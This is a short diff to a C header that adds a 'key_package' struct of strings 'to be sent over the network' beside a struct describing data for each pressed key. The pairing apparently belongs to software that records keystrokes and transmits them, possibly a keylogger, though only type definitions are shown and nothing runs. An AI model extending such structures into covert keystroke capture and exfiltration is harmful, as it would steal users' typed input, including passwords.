@@ -1,6 +1,13 @@
 #pragma once
 
 /**
+ * Represents all the data that is sent over the network
+ */
+typedef struct {
+  char** keys;  // an array of strings to be sent over the network
+} key_package;
+
+/**
  * Represents all the associated data for one key that was pressed
  */
 typedef struct {
